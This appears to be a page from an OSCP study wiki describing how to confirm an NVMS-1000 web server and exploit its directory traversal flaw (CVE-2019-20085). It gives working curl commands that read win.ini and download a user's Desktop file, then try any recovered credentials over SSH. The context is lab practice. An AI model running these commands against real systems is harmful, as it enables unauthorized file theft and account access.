# Windows - Web - NVMS-1000

**Windows web supplement**

*Confirm the NVMS-1000 fingerprint, prove traversal safely, then read a known Windows file.*

## Run this

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
~~~bash
curl -s http://$BoxIP/Pages/login.htm | grep -i title
searchsploit nvms
searchsploit -x 47774
~~~

## Example output

~~~text
<title>NVMS-1000</title>
NVMS 1000 - Directory Traversal
~~~

## What did you get?

- **NVMS-1000 confirmed:** test CVE-2019-20085 traversal.
- **No NVMS-1000:** return to Step 23 · [[Windows - Web Enum]] and enumerate the web service again.

## Run this

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
~~~bash
curl -s --path-as-is http://$BoxIP/../../../../../../../../../../../../windows/win.ini
~~~

## Example output

~~~text
; for 16-bit app support
[fonts]
[extensions]
~~~

## What did you get?

- **win.ini returned:** run the same traversal request with the filename from the FTP note and save the response to `$BoxDir/loot/reading.txt`.
- **404 or login page:** rerun the `curl` command with `--path-as-is` and one additional `../` segment, then compare the status code.

## Run this

> **Why:** This request tests the identified web parameter or endpoint and records the response that proves whether the suspected behavior is present.
~~~bash
curl -s --path-as-is \
  http://$BoxIP/../../../../../../../../../../../../Users/$Username2/Desktop/$File \
  -o $BoxDir/loot/$File
~~~

## Example output

~~~text
HTTP/1.1 200 OK
file saved to loot
~~~

## What did you get?

- **A non-empty file is saved:** run `sed -n '1,120p' $BoxDir/loot/reading.txt`, then validate any credential with `ssh $Username@$BoxIP` or the exposed service.
- **Empty or 404:** confirm the Windows path, filename, and account name.

## Gotcha

Curl normalises ../ by default. Without --path-as-is, the traversal can be stripped before the request reaches the application. Test windows/win.ini first because it is a predictable readable file.

## External Resources

- [HackTricks NVMS-1000](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nvms-1000)
- [Exploit-DB 47774](https://www.exploit-db.com/exploits/47774)
## Seen in
- *(no write-up yet)*

## Related stages

- [[Windows - Service Scan]]
- [[Windows - Web Enum]]
- [[Windows - SMB Enum]]
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
